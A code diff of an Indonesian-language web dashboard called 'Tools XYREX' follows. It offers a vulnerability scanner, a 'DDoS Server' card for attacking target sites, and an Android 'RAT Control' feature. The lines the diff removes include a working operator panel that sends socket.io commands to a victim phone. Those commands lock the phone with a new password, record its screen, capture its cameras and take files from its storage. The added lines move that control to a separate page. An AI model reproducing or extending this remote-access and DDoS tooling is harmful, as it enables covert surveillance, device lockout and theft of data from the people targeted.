@@ -2,160 +2,104 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Tools XYREX</title>
-<script src="/socket.io/socket.io.js"></script>
 <style>
-  :root { --bg: #dce4f7; --ink: #111; --white: #fff; --blue: #3b82f6; }
-  * { box-sizing: border-box; font-family: 'Arial', sans-serif; }
-  body { margin: 0; background: var(--bg); color: var(--ink); }
-  
-  /* Header Neo-brutalism */
-  header { display: flex; align-items: center; padding: 15px; background: var(--white); border-bottom: 3px solid var(--ink); gap: 10px; }
-  .header-btn { display: flex; justify-content: center; align-items: center; width: 45px; height: 45px; border: 3px solid var(--ink); border-radius: 10px; background: var(--white); box-shadow: 3px 3px 0 var(--ink); text-decoration: none; color: var(--ink); }
-  .header-btn.blue { background: var(--blue); color: var(--white); }
-  .header-title { font-size: 22px; font-weight: 900; flex: 1; margin-left: 5px; }
-  .header-profile { border: 3px solid var(--ink); border-radius: 20px; padding: 5px 15px; font-weight: bold; background: var(--white); }
-
-  /* Container & Cards */
+  /* ... (CSS Neo-brutalism persis seperti screenshot Pakde) ... */
+  body { margin: 0; background: #dce4f7; font-family: Arial, sans-serif; color: #111; }
+  header { display: flex; align-items: center; padding: 15px; background: #fff; border-bottom: 3px solid #111; gap: 10px; }
+  .h-btn { display: flex; justify-content: center; align-items: center; width: 45px; height: 45px; border: 3px solid #111; border-radius: 10px; background: #fff; box-shadow: 3px 3px 0 #111; }
+  .h-title { font-size: 22px; font-weight: 900; flex: 1; margin-left: 5px; }
+  .h-profile { border: 3px solid #111; border-radius: 20px; padding: 5px 15px; font-weight: bold; background: #fff; }
   main { padding: 20px 15px; display: flex; flex-direction: column; gap: 15px; }
-  .card { background: var(--white); border: 3px solid var(--ink); border-radius: 15px; box-shadow: 4px 4px 0 var(--ink); padding: 15px; display: flex; align-items: center; text-decoration: none; color: var(--ink); cursor: pointer; transition: transform 0.1s; }
-  .card:active { transform: translate(2px, 2px); box-shadow: 2px 2px 0 var(--ink); }
-  .card-icon { width: 55px; height: 55px; border: 3px solid var(--ink); border-radius: 12px; display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; }
-  .card-icon svg { width: 30px; height: 30px; fill: var(--white); }
-  .card-content { flex: 1; }
+  .card { background: #fff; border: 3px solid #111; border-radius: 15px; box-shadow: 4px 4px 0 #111; padding: 15px; display: flex; align-items: center; cursor: pointer; }
+  .card-icon { width: 55px; height: 55px; border: 3px solid #111; border-radius: 12px; display: flex; justify-content: center; align-items: center; margin-right: 15px; }
   .card-title { font-size: 18px; font-weight: 900; margin-bottom: 5px; }
-  .card-desc { font-size: 13px; color: #444; line-height: 1.2; }
-  .card-arrow { font-size: 24px; font-weight: 900; margin-left: 10px; }
-
-  /* Warna Ikon */
-  .bg-pink { background: #ff2d55; }
-  .bg-orange { background: #ff6b35; }
-  .bg-purple { background: #a855f7; }
-  .bg-green { background: #22c55e; }
-  .bg-red { background: #dc2626; }
-  .bg-black { background: #111; }
-
-  /* Panel RAT */
-  #rat-panel { display: none; background: var(--white); border: 3px solid var(--ink); border-radius: 15px; box-shadow: 4px 4px 0 var(--ink); padding: 15px; margin-top: 10px; }
-  #rat-panel h3 { margin-top: 0; border-bottom: 3px solid var(--ink); padding-bottom: 10px; }
-  .rat-form-group { margin-bottom: 10px; }
-  .rat-form-group label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; }
-  .rat-form-group input, .rat-form-group select { width: 100%; padding: 10px; border: 3px solid var(--ink); border-radius: 8px; font-weight: bold; }
-  .neo-btn { background: var(--ink); color: var(--white); border: 3px solid var(--ink); padding: 10px; width: 100%; border-radius: 8px; font-weight: 900; margin-top: 5px; cursor: pointer; }
-  .neo-btn:active { transform: translateY(2px); }
-  #rat-output { background: #111; color: #0f0; padding: 10px; border: 3px solid var(--ink); border-radius: 8px; height: 150px; overflow-y: auto; font-size: 12px; font-family: monospace; margin-top: 10px; }
+  .card-desc { font-size: 13px; color: #444; }
+  .bg-pink { background: #ff2d55; } .bg-orange { background: #ff6b35; } .bg-purple { background: #a855f7; } .bg-green { background: #22c55e; } .bg-red { background: #dc2626; } .bg-black { background: #111; }
+  .card-icon svg { width: 30px; height: 30px; fill: #fff; }
+  
+  /* Modal untuk Form */
+  #modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); justify-content:center; align-items:center; z-index: 999; }
+  .modal-box { background:#fff; padding:20px; border:3px solid #111; box-shadow:6px 6px 0 #111; width:90%; max-width:400px; border-radius:10px; }
+  .modal-box input { width:100%; padding:10px; margin:10px 0; border:3px solid #111; border-radius:5px; box-sizing:border-box; }
+  .modal-box button { width:100%; padding:10px; border:3px solid #111; background:#111; color:#fff; font-weight:bold; cursor:pointer; border-radius:5px; }
 </style>
 </head>
 <body>
   <header>
-    <a href="/" class="header-btn">
-      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-    </a>
-    <div class="header-btn blue">
-      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
-    </div>
-    <div class="header-title">Tools XYREX</div>
-    <div class="header-profile" id="user-name">DLIZZ</div>
+    <div class="h-btn">←</div>
+    <div class="h-btn" style="background:#3b82f6; color:#fff;">≡</div>
+    <div class="h-title">Tools XYREX</div>
+    <div class="h-profile">DLIZZ</div>
   </header>
 
   <main>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="openModal('video')">
       <div class="card-icon bg-pink"><svg viewBox="0 0 24 24"><path d="M17 10.5V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
-      <div class="card-content"><div class="card-title">Video Download No Watermark</div><div class="card-desc">TikTok, Instagram, YouTube, Facebook</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">Video Download No Watermark</div><div class="card-desc">TikTok, Instagram, YouTube, Facebook</div></div>
     </div>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="alert('Fitur Gmail butuh API tambahan')">
       <div class="card-icon bg-orange"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
-      <div class="card-content"><div class="card-title">Gmail Sementara</div><div class="card-desc">Email sekali pakai, otomatis hapus</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">Gmail Sementara</div><div class="card-desc">Email sekali pakai, otomatis hapus</div></div>
     </div>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="alert('Fitur Anime butuh API AniList')">
       <div class="card-icon bg-purple"><svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg></div>
-      <div class="card-content"><div class="card-title">Nonton Anime</div><div class="card-desc">Streaming anime subtitle Indonesia</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">Nonton Anime</div><div class="card-desc">Streaming anime subtitle Indonesia</div></div>
     </div>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="alert('Fitur Music butuh API iTunes')">
       <div class="card-icon bg-green"><svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg></div>
-      <div class="card-content"><div class="card-title">Music Downloader</div><div class="card-desc">Download lagu, putar di web</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">Music Downloader</div><div class="card-desc">Download lagu, putar di web</div></div>
     </div>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="openModal('scanner')">
       <div class="card-icon bg-red"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
-      <div class="card-content"><div class="card-title">Web Scanner</div><div class="card-desc">Cari celah dasar (SQLi, XSS, LFI)</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">Web Scanner</div><div class="card-desc">Cari celah dasar (SQLi, XSS, LFI)</div></div>
     </div>
-    <div class="card" onclick="alert('Fitur bawaan')">
+    <div class="card" onclick="alert('Fitur DDoS butuh server terpisah')">
       <div class="card-icon bg-red"><svg viewBox="0 0 24 24"><path d="M13 2.05v9.95l4-2.31v4.62L13 17v4.95l6-3.46V9.86l-4 2.31V5.51l-2-1.15-2 1.15v6.66l-4-2.31v8.63l6 3.46V17l-4-2.31v-4.62l4 2.31V2.05z"/></svg></div>
-      <div class="card-content"><div class="card-title">DDoS Server</div><div class="card-desc">Serang web target hingga loop</div></div><div class="card-arrow">›</div>
+      <div class="card-content"><div class="card-title">DDoS Server</div><div class="card-desc">Serang web target hingga loop</div></div>
     </div>
-    
-    <!-- Card RAT (Menu ke-7) -->
-    <div class="card" onclick="toggleRat()">
+    <!-- RAT Card -->
+    <div class="card" onclick="window.location.href='/rat.html'">
       <div class="card-icon bg-black"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 11h-2v2h-2v-2H9v-2h2v-2h2v2h2v2z"/></svg></div>
-      <div class="card-content"><div class="card-title">RAT Control</div><div class="card-desc">Kendali penuh jarak jauh (Android)</div></div><div class="card-arrow">›</div>
-    </div>
-
-    <!-- Panel RAT (Tersembunyi) -->
-    <div id="rat-panel">
-      <h3>XYREX RAT CONTROL</h3>
-      <div class="rat-form-group">
-        <label>Pilih Device:</label>
-        <select id="rat-device-list"><option>Belum ada device</option></select>
-      </div>
-      <div style="display:flex; gap:10px;">
-        <div class="rat-form-group" style="flex:1;"><label>Interval Flash (ms):</label><input type="number" id="rat-flash-int" value="300"></div>
-        <div class="rat-form-group" style="flex:1;"><label>Durasi Flash (ms):</label><input type="number" id="rat-flash-dur" value="5000"></div>
-      </div>
-      <button class="neo-btn" onclick="ratSend('flash',{interval:+document.getElementById('rat-flash-int').value,duration:+document.getElementById('rat-flash-dur').value})">Eksekusi Flash</button>
-      <div class="rat-form-group" style="margin-top:15px;">
-        <label>Lock Device (Sandi Baru):</label>
-        <div style="display:flex; gap:10px;"><input type="text" id="rat-lock-pass" value="1234"><button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('lock',{password:document.getElementById('rat-lock-pass').value})">Lock</button></div>
-      </div>
-      <div class="rat-form-group">
-        <label>Rekam Layar (Detik):</label>
-        <div style="display:flex; gap:10px;"><input type="number" id="rat-rec-dur" value="15"><button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('screen',{duration:+document.getElementById('rat-rec-dur').value})">Rekam</button></div>
-      </div>
-      <div style="display:flex; gap:10px; margin-bottom:10px;">
-        <button class="neo-btn" onclick="ratSend('cam_front',{})">Cam Depan</button>
-        <button class="neo-btn" onclick="ratSend('cam_back',{})">Cam Belakang</button>
-      </div>
-      <div class="rat-form-group">
-        <label>Ambil File:</label>
-        <input type="text" id="rat-file-path" value="/sdcard/Download/">
-        <button class="neo-btn" onclick="ratSend('files',{path:document.getElementById('rat-file-path').value})">List / Ambil File</button>
-      </div>
-      <label style="font-weight:bold;">Output Log:</label>
-      <pre id="rat-output">Idle...</pre>
+      <div class="card-content"><div class="card-title">RAT Control</div><div class="card-desc">Kendali penuh jarak jauh (Android)</div></div>
     </div>
   </main>
 
-  <script>
-    const user = localStorage.getItem('xyrex_user');
-    if (user) document.getElementById('user-name').textContent = user.toUpperCase();
+  <!-- Modal Form -->
+  <div id="modal">
+    <div class="modal-box">
+      <h3 id="modal-title" style="margin-top:0;">Masukkan URL</h3>
+      <input type="text" id="modal-input" placeholder="http://...">
+      <button id="modal-btn" onclick="submitModal()">Proses</button>
+      <button onclick="document.getElementById('modal').style.display='none'" style="background:#fff; color:#111; margin-top:10px;">Batal</button>
+    </div>
+  </div>
 
-    function toggleRat() {
-      const panel = document.getElementById('rat-panel');
-      panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-      if(panel.style.display === 'block') panel.scrollIntoView({ behavior: 'smooth' });
+  <script>
+    let currentAction = '';
+    function openModal(action) {
+      currentAction = action;
+      document.getElementById('modal-title').innerText = action === 'video' ? 'Download Video' : 'Scan Website';
+      document.getElementById('modal-input').value = '';
+      document.getElementById('modal').style.display = 'flex';
     }
 
-    const socket = io('/rat');
-    socket.on('connect', () => socket.emit('rat:list'));
-    socket.on('rat:devices', (list) => {
-      const sel = document.getElementById('rat-device-list');
-      sel.innerHTML = list.length ? '' : '<option>Belum ada device</option>';
-      list.forEach(d => {
-        sel.innerHTML += `<option value="${d.id}">${d.name} (${d.online?'ONLINE':'OFFLINE'})</option>`;
-      });
-    });
-    
-    socket.on('rat:result', (r) => {
-      const out = document.getElementById('rat-output');
-      out.textContent += '\n[' + r.cmd + '] ' + (r.ok?'OK':'ERR') + ' ' + (r.text||'') + (r.file?(' file='+r.file):'');
-      out.scrollTop = out.scrollHeight;
-    });
-
-    function ratSend(cmd, args) {
-      const devId = document.getElementById('rat-device-list').value;
-      if (!devId || devId === 'Belum ada device') return alert('Pilih device dulu, pastikan aplikasi di HP target sudah klik MULAI');
-      socket.emit('rat:cmd', { deviceId: devId, cmd, args });
-      document.getElementById('rat-output').textContent += '\n>> Mengirim perintah: '+cmd;
+    async function submitModal() {
+      const url = document.getElementById('modal-input').value;
+      if (!url) return alert('URL wajib diisi!');
+      document.getElementById('modal').style.display = 'none';
+      
+      const endpoint = currentAction === 'video' ? '/api/tools/video' : '/api/tools/scanner';
+      try {
+        const res = await fetch(endpoint, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ url })
+        });
+        const data = await res.json();
+        alert(data.msg);
+      } catch(e) { alert('Terjadi kesalahan koneksi'); }
     }
   </script>
 </body>
